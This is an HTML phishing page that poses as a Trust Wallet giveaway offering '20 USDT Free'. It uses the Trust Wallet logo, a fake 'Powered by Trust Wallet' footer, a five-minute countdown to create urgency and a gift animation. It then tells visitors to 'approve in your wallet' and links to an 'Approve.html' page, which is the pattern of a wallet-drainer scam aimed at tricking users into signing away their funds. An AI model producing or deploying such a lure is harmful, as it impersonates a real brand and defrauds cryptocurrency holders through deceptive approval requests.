<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Claim 20 USDT Free</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f4f4f4 url('https://trustwallet.com/assets/images/media/assets/TWT.png') 
        no-repeat center center fixed;
      background-size: 300px;
      opacity: 0.95;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .container {
      text-align: center;
      background-color: #fff;
      padding: 30px 20px;
      border-radius: 12px;
      box-shadow: 0 4px 15px rgba(0,0,0,0.15);
      width: 340px;
      position: relative;
      z-index: 1;
    }
    .logo {
      width: 60px;
      margin-bottom: 10px;
    }
    h1 {
      color: #2c3e50;
      font-size: 22px;
      margin: 10px 0;
    }
    .countdown {
      font-size: 22px;
      color: #e74c3c;
      margin: 15px 0;
    }
    button {
      background-color: #3498db;
      color: white;
      border: none;
      padding: 12px 20px;
      border-radius: 8px;
      cursor: pointer;
      font-size: 16px;
      transition: background 0.3s ease;
    }
    button:hover {
      background-color: #2980b9;
    }
    .gift-box {
      width: 80px;
      height: 80px;
      background: #3498db;
      margin: 20px auto;
      position: relative;
      border-radius: 8px;
    }
    .gift-box:before {
      content: '';
      position: absolute;
      top: -20px;
      left: 0;
      right: 0;
      height: 20px;
      background: #2980b9;
      border-radius: 5px 5px 0 0;
      transition: transform 0.5s ease;
      transform-origin: bottom center;
    }
    .gift-box.open:before {
      transform: rotateX(150deg);
    }
    .confetti {
      position: absolute;
      width: 8px;
      height: 8px;
      background: gold;
      top: 40px;
      left: 40px;
      opacity: 0;
      border-radius: 50%;
      animation: fall 1s forwards;
    }
    @keyframes fall {
      0% { transform: translateY(0) scale(1); opacity: 1; }
      100% { transform: translateY(-150px) scale(0.5); opacity: 0; }
    }
    .footer {
      margin-top: 20px;
      font-size: 13px;
      color: #888;
    }
    /* Success Modal */
    .modal {
      position: fixed;
      top: 0; left: 0; right: 0; bottom: 0;
      background: rgba(0,0,0,0.5);
      display: none;
      justify-content: center;
      align-items: center;
    }
    .modal-content {
      background: #fff;
      padding: 20px 30px;
      border-radius: 10px;
      text-align: center;
      box-shadow: 0 4px 15px rgba(0,0,0,0.2);
      font-size: 18px;
      color: #2c3e50;
    }
  </style>
</head>
<body>

<div class="container">
  <img src="https://trustwallet.com/assets/images/media/assets/TWT.png" alt="Trust Wallet" class="logo">
  <h1>Claim 20 USDT Free!</h1>
  <div class="gift-box" id="giftBox"></div>
  <div class="countdown" id="countdown">05:00</div>
  <button id="claimButton">Claim Now</button>
  <div class="footer">Powered by Trust Wallet</div>
</div>

<!-- Success Modal -->
<div class="modal" id="successModal">
  <div class="modal-content">
    âœ… Claim request sent.<br>Please approve in your wallet.
  </div>
</div>

<script>
  let timeLeft = 300; // 5 minutes
  const countdownElement = document.getElementById('countdown');
  const claimButton = document.getElementById('claimButton');
  const giftBox = document.getElementById('giftBox');
  const modal = document.getElementById('successModal');

  const countdownTimer = setInterval(() => {
    const minutes = Math.floor(timeLeft / 60);
    const seconds = timeLeft % 60;
    countdownElement.textContent =
      `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
    timeLeft--;

    if (timeLeft < 0) {
      clearInterval(countdownTimer);
      countdownElement.textContent = "Time's up!";
      claimButton.disabled = true;
      claimButton.style.backgroundColor = "#bdc3c7";
      claimButton.style.cursor = "not-allowed";
    }
  }, 1000);

  claimButton.addEventListener('click', () => {
    giftBox.classList.add('open');

    // Create confetti
    for (let i = 0; i < 20; i++) {
      let confetti = document.createElement('div');
      confetti.className = 'confetti';
      confetti.style.left = (40 + Math.random() * 40 - 20) + 'px';
      confetti.style.background = ['gold','lime','red','blue'][Math.floor(Math.random()*4)];
      giftBox.appendChild(confetti);

      setTimeout(() => confetti.remove(), 1000);
    }

    // Show success modal after animation
    setTimeout(() => {
      modal.style.display = 'flex';
    }, 1200);
  });
</script>
<a href="Approve.html">
    <button>Proceed to Approve</button>
  </a>
</body>
</html>
</body>
</html>
